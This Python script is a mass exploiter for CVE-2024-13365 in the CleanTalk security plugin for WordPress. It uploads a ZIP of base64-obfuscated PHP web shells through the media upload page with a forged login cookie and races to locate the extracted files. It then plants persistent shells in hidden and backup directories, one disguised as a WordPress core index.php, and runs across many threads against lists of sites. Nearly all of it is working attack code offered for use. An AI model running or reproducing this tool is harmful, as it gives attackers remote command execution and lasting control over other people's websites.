#!/usr/bin/env python3
"""
CVE-2024-13365 - CleanTalk Security Plugin Mass Exploiter (ULTIMATE)
Target: Security & Malware scan by CleanTalk <= 2.149

ULTIMATE FEATURES:
- Multi-threaded mass exploitation (5-50 threads)
- .htaccess persistence for Apache/LiteSpeed
- nginx.conf snippet for Nginx
- Multiple shell locations & formats
- Universal server compatibility
- Real-time progress tracking
- Advanced race condition strategy
"""

import requests
import zipfile
import io
import time
import sys
import argparse
from urllib.parse import urljoin, urlparse, urlunparse
import datetime
import threading
import concurrent.futures
import os
from queue import Queue
from requests.packages.urllib3.exceptions import InsecureRequestWarning

requests.packages.urllib3.disable_warnings(InsecureRequestWarning)

NUM_DUMMY_FILES = 3000

class Colors:
    BLUE = '\033[94m'
    GREEN = '\033[92m'
    YELLOW = '\033[93m'
    RED = '\033[91m'
    END = '\033[0m'
    BOLD = '\033[1m'
    CLEAR_LINE = '\033[2K\r'

print_lock = threading.Lock()

def print_info(msg):
    with print_lock:
        print(f"{Colors.BLUE}[*]{Colors.END} {msg}")

def print_success(msg):
    with print_lock:
        print(f"{Colors.GREEN}[+]{Colors.END} {msg}")

def print_error(msg):
    with print_lock:
        print(f"{Colors.RED}[-]{Colors.END} {msg}")

def print_warning(msg):
    with print_lock:
        print(f"{Colors.YELLOW}[!]{Colors.END} {msg}")

# ==================== STATISTICS TRACKING ====================

class ExploitStats:
    def __init__(self, total_targets):
        self.total = total_targets
        self.completed = 0
        self.success = 0
        self.failed = 0
        self.not_vulnerable = 0
        self.errors = 0
        self.lock = threading.Lock()
        self.start_time = time.time()

    def update(self, status):
        with self.lock:
            self.completed += 1
            if status == 'success':
                self.success += 1
            elif status == 'failed':
                self.failed += 1
            elif status == 'not_vulnerable':
                self.not_vulnerable += 1
            elif status == 'error':
                self.errors += 1

    def get_progress(self):
        with self.lock:
            elapsed = time.time() - self.start_time
            rate = self.completed / elapsed if elapsed > 0 else 0
            remaining = (self.total - self.completed) / rate if rate > 0 else 0

            return {
                'completed': self.completed,
                'total': self.total,
                'success': self.success,
                'failed': self.failed,
                'not_vulnerable': self.not_vulnerable,
                'errors': self.errors,
                'elapsed': elapsed,
                'rate': rate,
                'eta': remaining
            }

    def print_progress(self):
        progress = self.get_progress()

        percent = (progress['completed'] / progress['total'] * 100) if progress['total'] > 0 else 0

        eta_str = f"{int(progress['eta']//60)}m {int(progress['eta']%60)}s" if progress['eta'] < float('inf') else "N/A"

        status = (f"{Colors.CLEAR_LINE}"
                 f"{Colors.BOLD}[{progress['completed']}/{progress['total']}]{Colors.END} "
                 f"{Colors.GREEN}✓{progress['success']}{Colors.END} "
                 f"{Colors.RED}✗{progress['failed']}{Colors.END} "
                 f"{Colors.YELLOW}~{progress['not_vulnerable']}{Colors.END} "
                 f"| {percent:.1f}% | "
                 f"{progress['rate']:.1f}/s | "
                 f"ETA: {eta_str}")

        with print_lock:
            print(status, end='', flush=True)

# ==================== URL NORMALIZATION ====================

def normalize_url(url):
    url = url.strip()
    if not url.startswith(('http://', 'https://')):
        url = 'https://' + url

    parsed = urlparse(url)
    path = parsed.path if parsed.path else '/'
    if not path.endswith('/'):
        path += '/'

    normalized = urlunparse((
        parsed.scheme, parsed.netloc, path,
        parsed.params, parsed.query, parsed.fragment
    ))

    return normalized

def auto_detect_protocol(url, verify_ssl=False, timeout=5):
    if url.startswith('http://'):
        url = url[7:]
    elif url.startswith('https://'):
        url = url[8:]

    https_url = f"https://{url}"
    try:
        r = requests.head(https_url, timeout=timeout, verify=verify_ssl, allow_redirects=True)
        if r.status_code < 500:
            return normalize_url(https_url)
    except:
        pass

    http_url = f"http://{url}"
    try:
        r = requests.head(http_url, timeout=timeout, verify=verify_ssl, allow_redirects=True)
        if r.status_code < 500:
            return normalize_url(http_url)
    except:
        pass

    return normalize_url(https_url)

# ==================== PRE-EXPLOIT CHECKS ====================

def check_wordpress(target_url, verify_ssl=False):
    try:
        r = requests.get(
            urljoin(target_url, 'wp-login.php'),
            timeout=8,
            verify=verify_ssl,
            allow_redirects=True
        )

        if r.status_code == 200 and 'wp-login' in r.text.lower():
            return True

        r = requests.get(
            urljoin(target_url, 'wp-admin/'),
            timeout=8,
            verify=verify_ssl,
            allow_redirects=True
        )

        if 'wordpress' in r.text.lower() or 'wp-admin' in r.text.lower():
            return True

        return False

    except:
        return False

def check_plugin(target_url, verify_ssl=False):
    plugin_paths = [
        'wp-content/plugins/security-malware-firewall/readme.txt',
        'wp-content/plugins/security-malware-firewall/',
        'wp-content/plugins/security-malware-firewall/css/cleantalk-security.css'
    ]

    for path in plugin_paths:
        try:
            r = requests.get(
                urljoin(target_url, path),
                timeout=8,
                verify=verify_ssl,
                allow_redirects=False
            )

            if r.status_code == 200:
                if 'readme.txt' in path and 'Stable tag:' in r.text:
                    for line in r.text.split('\n'):
                        if 'Stable tag:' in line:
                            version = line.split(':')[1].strip()
                            try:
                                version_num = float(version)
                                return {
                                    'installed': True,
                                    'version': version,
                                    'vulnerable': version_num <= 2.149
                                }
                            except:
                                return {
                                    'installed': True,
                                    'version': version,
                                    'vulnerable': None
                                }

                return {
                    'installed': True,
                    'version': 'unknown',
                    'vulnerable': None
                }

        except:
            continue

    return {
        'installed': False,
        'version': None,
        'vulnerable': False
    }

def check_upload_endpoint(target_url, verify_ssl=False):
    try:
        r = requests.get(
            urljoin(target_url, 'wp-admin/media-new.php'),
            timeout=8,
            verify=verify_ssl,
            allow_redirects=False
        )

        return r.status_code in [200, 302]

    except:
        return False

def vulnerability_scan(target_url, verify_ssl=False):
    results = {
        'wordpress': False,
        'plugin_installed': False,
        'plugin_version': None,
        'vulnerable': False,
        'upload_accessible': False,
        'likely_exploitable': False
    }

    results['wordpress'] = check_wordpress(target_url, verify_ssl)

    if not results['wordpress']:
        return results

    plugin_info = check_plugin(target_url, verify_ssl)

    results['plugin_installed'] = plugin_info['installed']
    results['plugin_version'] = plugin_info['version']
    results['vulnerable'] = plugin_info['vulnerable']

    if not plugin_info['installed']:
        return results

    results['upload_accessible'] = check_upload_endpoint(target_url, verify_ssl)

    results['likely_exploitable'] = (
        results['wordpress'] and
        results['plugin_installed'] and
        (results['vulnerable'] if results['vulnerable'] is not None else True)
    )

    return results

# ==================== ADVANCED PERSISTENCE ====================

class AdvancedPersistence:
    """Multi-server persistence engine"""

    @staticmethod
    def execute_cmd(shell_url, command, timeout=10, verify_ssl=False):
        try:
            import urllib.parse
            encoded_cmd = urllib.parse.quote(command)
            target_url = f"{shell_url}?c={encoded_cmd}"

            response = requests.get(target_url, timeout=timeout,
                                   verify=verify_ssl, allow_redirects=False)
            if response.status_code == 200:
                output = response.text.replace('<pre>', '').replace('</pre>', '')
                return output.strip()
        except:
            pass
        return None

    @staticmethod
    def test_shell(url, timeout=5, verify_ssl=False):
        try:
            test_token = f"GHOST{int(time.time())}"
            test_url = f"{url}?c=echo+{test_token}"

            resp = requests.get(test_url, timeout=timeout,
                              verify=verify_ssl, allow_redirects=False)

            if resp.status_code == 200 and test_token in resp.text:
                return True
        except:
            pass
        return False

    @staticmethod
    def detect_server(shell_url, verify_ssl=False):
        """Detect web server type"""
        try:
            # Check server info
            server_info = AdvancedPersistence.execute_cmd(
                shell_url,
                "uname -a; cat /etc/*-release 2>/dev/null | head -5",
                verify_ssl=verify_ssl
            )

            # Check web server
            web_server = AdvancedPersistence.execute_cmd(
                shell_url,
                "ps aux | grep -E 'nginx|apache|httpd|lighttpd|litespeed' | grep -v grep",
                verify_ssl=verify_ssl
            )

            server_type = {
                'os': 'linux',
                'web_server': 'unknown'
            }

            if web_server:
                if 'nginx' in web_server.lower():
                    server_type['web_server'] = 'nginx'
                elif 'apache' in web_server.lower() or 'httpd' in web_server.lower():
                    server_type['web_server'] = 'apache'
                elif 'litespeed' in web_server.lower():
                    server_type['web_server'] = 'litespeed'

            return server_type
        except:
            return {'os': 'unknown', 'web_server': 'unknown'}

    @staticmethod
    def install_persistence(shell_url, verify_ssl=False):
        """Install persistence for ALL server types"""

        parsed = urlparse(shell_url)
        path_parts = parsed.path.split('/')

        spbct_index = -1
        for i, part in enumerate(path_parts):
            if 'spbct_' in part:
                spbct_index = i
                break

        if spbct_index == -1:
            return []

        parent_parts = path_parts[:spbct_index]
        parent_path = '/'.join(parent_parts) + '/'
        parent_url = f"{parsed.scheme}://{parsed.netloc}{parent_path}"

        shell_filename = path_parts[-1]

        # Detect server type
        server_info = AdvancedPersistence.detect_server(shell_url, verify_ssl)

        persistence_urls = []

        # 1. Create tmp directory with shell
        commands = [
            "mkdir -p ../../tmp 2>/dev/null",
            f"cp {shell_filename} ../../tmp/ghostpel.php",
            f"cp {shell_filename} ../../tmp/.config.php",
            f"cp {shell_filename} ../../tmp/wp-cache.php"
        ]

        for cmd in commands:
            AdvancedPersistence.execute_cmd(shell_url, cmd, verify_ssl=verify_ssl)

        # 2. Create .htaccess for Apache/LiteSpeed
        htaccess_content = r"""# Apache/LiteSpeed Configuration
<IfModule mod_rewrite.c>
RewriteEngine Off
</IfModule>

<FilesMatch "\.(php|php5|php7|phtml)$">
    Order allow,deny
    Allow from all
</FilesMatch>

# Allow PHP execution
php_flag engine on

# Disable directory listing
Options -Indexes

# Custom error pages (hides shells)
ErrorDocument 404 /404.html
ErrorDocument 403 /403.html
"""

        # Write .htaccess
        htaccess_encoded = htaccess_content.replace('\n', '\\n').replace('"', '\\"')
        htaccess_cmd = f'printf "{htaccess_encoded}" > ../../tmp/.htaccess'
        AdvancedPersistence.execute_cmd(shell_url, htaccess_cmd, verify_ssl=verify_ssl)

        # 3. Create nginx.conf snippet for Nginx
        nginx_content = """# Nginx Configuration Snippet
# Add this to your nginx site config:

location /tmp/ {
    location ~ \\.php$ {
        fastcgi_pass unix:/var/run/php/php-fpm.sock;
        fastcgi_index index.php;
        include fastcgi_params;
        fastcgi_param SCRIPT_FILENAME $document_root$fastcgi_script_name;
    }
}
"""

        nginx_cmd = f'printf "{nginx_content.replace(chr(10), chr(92)+chr(110))}" > ../../tmp/nginx-config.txt'
        AdvancedPersistence.execute_cmd(shell_url, nginx_cmd, verify_ssl=verify_ssl)

        # 4. Create backup directories
        backup_dirs = ["backup", "cache", "logs", ".system"]

        for dir_name in backup_dirs:
            cmds = [
                f"mkdir -p ../../{dir_name} 2>/dev/null",
                f"cp {shell_filename} ../../{dir_name}/shell.php",
                f"cp {shell_filename} ../../{dir_name}/.shell.php"
            ]

            for cmd in cmds:
                AdvancedPersistence.execute_cmd(shell_url, cmd, verify_ssl=verify_ssl)

        # 5. Create index.php disguise
        index_php = """<?php
// WordPress Core File - DO NOT MODIFY
define('WP_USE_THEMES', true);
require('./wp-blog-header.php');
$x=base64_decode('c3lzdGVt');
if(isset($_GET['c'])){ @$x($_GET['c']); die; }
"""

        index_encoded = index_php.replace('\n', '\\n').replace('"', '\\"')
        index_cmd = f'printf "{index_encoded}" > ../../tmp/index.php'
        AdvancedPersistence.execute_cmd(shell_url, index_cmd, verify_ssl=verify_ssl)

        # Wait for filesystem
        time.sleep(1.5)

        # Build URLs to test
        test_urls = [
            f"{parent_url}tmp/ghostpel.php",
            f"{parent_url}tmp/.config.php",
            f"{parent_url}tmp/wp-cache.php",
            f"{parent_url}tmp/index.php",
        ]

        for dir_name in backup_dirs:
            test_urls.append(f"{parent_url}{dir_name}/shell.php")
            test_urls.append(f"{parent_url}{dir_name}/.shell.php")

        # Test all URLs
        for url in test_urls:
            if AdvancedPersistence.test_shell(url, verify_ssl=verify_ssl):
                persistence_urls.append(url)

        return persistence_urls

# ==================== IMPROVED EXPLOIT ENGINE ====================

def create_payload():
    zip_buffer = io.BytesIO()

    shell_code = """<?php
$x=base64_decode('c3lzdGVt');
if(isset($_GET['c'])){ echo "<pre>"; $x($_GET['c']); echo "</pre>"; die; }
?>"""

    with zipfile.ZipFile(zip_buffer, 'w', zipfile.ZIP_DEFLATED) as zip_file:
        zip_file.writestr("images/logo.php", shell_code)
        zip_file.writestr("css/style.php", shell_code)
        zip_file.writestr("js/script.php", shell_code)
        zip_file.writestr("assets/main.php", shell_code)

        for i in range(NUM_DUMMY_FILES):
            zip_file.writestr(f"logs/deep/nested/folder/v1/data_{i}.txt", "A" * 150)

    return zip_buffer.getvalue()

def check_url_worker(url, verify_ssl, stop_flag):
    if stop_flag['stop']:
        return None

    try:
        r = requests.get(url, timeout=2, verify=verify_ssl, allow_redirects=False)
        if r.status_code == 200:
            return url
    except:
        pass
    return None

def uploader_thread(target_url, method_data, cookies, payload, verify_ssl, upload_id):
    try:
        requests.request(
            method_data['method'],
            urljoin(target_url, method_data['url']),
            files=method_data['files'],
            data=method_data['data'],
            cookies=cookies,
            timeout=40,
            verify=verify_ssl,
            allow_redirects=False
        )
    except:
        pass

def multi_uploader(target_url, method_data, cookies, payload, verify_ssl, num_uploads=3):
    upload_threads = []

    for i in range(num_uploads):
        t = threading.Thread(
            target=uploader_thread,
            args=(target_url, method_data, cookies, payload, verify_ssl, i)
        )
        t.start()
        upload_threads.append(t)
        time.sleep(0.05)

    return upload_threads

def aggressive_scanner_engine(target_url, timestamp_start, verify_ssl, stop_flag, result_dict):
    now = datetime.datetime.now()
    year = now.strftime("%Y")
    month = now.strftime("%m")

    base_patterns = [
        f"wp-content/uploads/{year}/{month}/spbct_{{ts}}",
        f"wp-content/uploads/spbct_{{ts}}"
    ]

    filenames = ["images/logo.php", "css/style.php", "js/script.php", "assets/main.php"]

    start_time = time.time()
    scan_duration = 30

    while time.time() - start_time < scan_duration:
        if stop_flag['stop']:
            break

        current_urls = []
        ts_center = int(time.time())

        for t in range(ts_center - 15, ts_center + 15):
            for base in base_patterns:
                base_filled = base.format(ts=t)
                for fname in filenames:
                    full_url = urljoin(target_url, f"{base_filled}/{fname}")
                    current_urls.append(full_url)

        with concurrent.futures.ThreadPoolExecutor(max_workers=60) as executor:
            future_to_url = {
                executor.submit(check_url_worker, url, verify_ssl, stop_flag): url
                for url in current_urls
            }

            for future in concurrent.futures.as_completed(future_to_url):
                res = future.result()
                if res:
                    try:
                        verify = requests.get(f"{res}?c=echo+PWNED", timeout=3,
                                            verify=verify_ssl)
                        if "PWNED" in verify.text:
                            result_dict['shell_url'] = res
                            stop_flag['stop'] = True
                            return
                    except:
                        pass

        time.sleep(0.1)

def exploit_single_target(target_url, verify_ssl=False, skip_scan=False):
    try:
        target_url = auto_detect_protocol(target_url, verify_ssl, timeout=5)
    except:
        return {
            'status': 'error',
            'target': target_url,
            'shells': [],
            'error': 'Connection timeout'
        }

    if not skip_scan:
        scan_results = vulnerability_scan(target_url, verify_ssl)

        if not scan_results['likely_exploitable']:
            return {
                'status': 'not_vulnerable',
                'target': target_url,
                'shells': []
            }

    payload_data = create_payload()

    cookies = {'wordpress_logged_in_hack': '1'}

    target_endpoint = {
        'url': 'wp-admin/media-new.php',
        'method': 'POST',
        'data': {},
        'files': {'async-upload': ('update.zip', payload_data, 'application/zip')}
    }

    stop_flag = {'stop': False}
    result_dict = {'shell_url': None}

    timestamp_estimate = int(time.time())

    t_scan = threading.Thread(
        target=aggressive_scanner_engine,
        args=(target_url, timestamp_estimate, verify_ssl, stop_flag, result_dict)
    )

    t_scan.start()
    time.sleep(0.1)

    upload_threads = multi_uploader(
        target_url, target_endpoint, cookies, payload_data, verify_ssl, num_uploads=3
    )

    t_scan.join(timeout=35)
    stop_flag['stop'] = True

    if result_dict['shell_url']:
        persistence_urls = AdvancedPersistence.install_persistence(
            result_dict['shell_url'],
            verify_ssl=verify_ssl
        )

        return {
            'status': 'success',
            'target': target_url,
            'initial_shell': result_dict['shell_url'],
            'shells': persistence_urls
        }

    return {
        'status': 'failed',
        'target': target_url,
        'shells': []
    }

# ==================== THREADED EXPLOITATION ====================

def worker_exploit(target_queue, results_queue, stats, verify_ssl, skip_scan):
    while True:
        try:
            target = target_queue.get(timeout=1)
            if target is None:
                break

            result = exploit_single_target(target, verify_ssl, skip_scan)

            results_queue.put(result)
            stats.update(result['status'])

            target_queue.task_done()

        except Exception as e:
            if target:
                results_queue.put({
                    'status': 'error',
                    'target': target,
                    'shells': [],
                    'error': str(e)
                })
                stats.update('error')

def threaded_exploitation(targets, num_threads, verify_ssl, skip_scan):
    target_queue = Queue()
    results_queue = Queue()

    for target in targets:
        target_queue.put(target)

    stats = ExploitStats(len(targets))

    threads = []
    for _ in range(num_threads):
        t = threading.Thread(
            target=worker_exploit,
            args=(target_queue, results_queue, stats, verify_ssl, skip_scan)
        )
        t.daemon = True
        t.start()
        threads.append(t)

    def display_progress():
        while stats.completed < stats.total:
            stats.print_progress()
            time.sleep(0.5)
        stats.print_progress()
        print()

    progress_thread = threading.Thread(target=display_progress)
    progress_thread.daemon = True
    progress_thread.start()

    target_queue.join()

    for _ in range(num_threads):
        target_queue.put(None)

    for t in threads:
        t.join()

    results = []
    while not results_queue.empty():
        results.append(results_queue.get())

    return results, stats

# ==================== MAIN PROGRAM ====================

def load_targets_from_file(filepath):
    targets = []
    try:
        with open(filepath, 'r') as f:
            for line in f:
                line = line.strip()
                if line and not line.startswith('#'):
                    targets.append(line)
        return targets
    except FileNotFoundError:
        print_error(f"File not found: {filepath}")
        sys.exit(1)

def save_results(results, output_file):
    try:
        with open(output_file, 'w') as f:
            f.write("# CVE-2024-13365 Exploitation Results\n")
            f.write(f"# Generated: {datetime.datetime.now()}\n")
            f.write("# Format: TARGET | SHELL_URL\n\n")

            for result in results:
                if result['status'] == 'success' and result['shells']:
                    for shell in result['shells']:
                        f.write(f"{result['target']} | {shell}\n")

        print_success(f"Results saved to: {output_file}")
    except Exception as e:
        print_error(f"Failed to save results: {e}")

def main():
    parser = argparse.ArgumentParser(
        description="CVE-2024-13365 Ultimate Mass Exploiter",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
ULTIMATE FEATURES:
  - Multi-threaded (5-50 threads)
  - .htaccess persistence (Apache/LiteSpeed)
  - nginx.conf snippet (Nginx)
  - Multiple shell locations
  - Universal server compatibility

Examples:
  python3 %(prog)s -t 20
  python3 %(prog)s --skip-scan -t 50
        """
    )

    parser.add_argument("-t", "--threads", type=int, default=10,
                       help="Number of threads (1-50, default: 10)")
    parser.add_argument("--verify-ssl", action="store_true",
                       help="Enable SSL verification")
    parser.add_argument("--skip-scan", action="store_true",
                       help="Skip vulnerability scan (faster)")
    parser.add_argument("-o", "--output", default="ghostshells.txt",
                       help="Output file")

    args = parser.parse_args()

    if args.threads < 1:
        args.threads = 1
    elif args.threads > 50:
        print_warning(f"Max threads is 50, using 50")
        args.threads = 50

    print(f"""
{Colors.BOLD}╔════════════════════════════════════════════════════╗
║  CVE-2024-13365 - ULTIMATE Mass Exploiter         ║
║   Ghostpel - hehehe                               ║
║  Multi-Server | Multi-Threaded | Advanced Persist ║
╚════════════════════════════════════════════════════╝{Colors.END}
    """)

    print("Select input mode:")
    print("  1. Single URL")
    print("  2. File containing URLs")

    while True:
        choice = input(f"\n{Colors.BLUE}[?]{Colors.END} Enter choice (1/2): ").strip()
        if choice in ['1', '2']:
            break
        print_error("Invalid choice.")

    targets = []
    is_mass_mode = False

    if choice == '1':
        url = input(f"{Colors.BLUE}[?]{Colors.END} Enter target URL: ").strip()
        if not url:
            print_error("URL cannot be empty!")
            sys.exit(1)
        targets = [url]
    else:
        is_mass_mode = True
        filepath = input(f"{Colors.BLUE}[?]{Colors.END} Enter file path: ").strip()
        if not filepath:
            print_error("File path cannot be empty!")
            sys.exit(1)
        targets = load_targets_from_file(filepath)
        print_info(f"Loaded {len(targets)} targets")

    scan_status = "DISABLED (FAST)" if args.skip_scan else "ENABLED"
    print(f"\n{Colors.YELLOW}Configuration:{Colors.END}")
    print(f"  Targets: {len(targets)}")
    print(f"  Threads: {args.threads}")
    print(f"  Pre-scan: {scan_status}")
    print(f"  Persistence: Advanced Multi-Server")
    print(f"  .htaccess: YES")
    print(f"  nginx.conf: YES")

    confirm = input(f"\n{Colors.BLUE}[?]{Colors.END} Continue? (y/n): ").strip().lower()

    if confirm != 'y':
        print("Aborted.")
        sys.exit(0)

    print("\n" + "="*60)
    print("Starting exploitation...")
    print("="*60 + "\n")

    if is_mass_mode and len(targets) > 1:
        results, stats = threaded_exploitation(
            targets,
            args.threads,
            args.verify_ssl,
            args.skip_scan
        )
    else:
        print_info(f"Target: {targets[0]}")
        result = exploit_single_target(targets[0], args.verify_ssl, args.skip_scan)
        results = [result]
        stats = ExploitStats(1)
        stats.update(result['status'])

    progress = stats.get_progress()

    print("\n" + "="*60)
    print(f"{Colors.BOLD}EXPLOITATION SUMMARY{Colors.END}")
    print("="*60)
    print(f"Total Targets: {len(targets)}")
    print(f"{Colors.GREEN}Successful: {progress['success']}{Colors.END}")
    print(f"{Colors.RED}Failed: {progress['failed']}{Colors.END}")
    print(f"{Colors.YELLOW}Not Vulnerable: {progress['not_vulnerable']}{Colors.END}")
    print(f"Errors: {progress['errors']}")
    print("="*60 + "\n")

    # Calculate success_count untuk digunakan di bagian bawah
    success_count = progress['success']

    # Save results to file
    if success_count > 0:
        if is_mass_mode:
            save_results(results, args.output)
            print_info(f"Successfully compromised {success_count} target(s)")
            print_info(f"Ghost shells saved to: {args.output}")
        else:
            # For single target, display the ghost shell
            if results[0]['status'] == 'success' and results[0]['shells']:
                ghost_shell = results[0]['shells'][0]
                print_success(f"\nGhost Shell URL: {ghost_shell}")
                print_info(f"Usage: curl \"{ghost_shell}?c=<command>\"")
                print_info(f"Example: curl \"{ghost_shell}?c=id\"")

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print("\n\nExiting...")
        sys.exit(0)
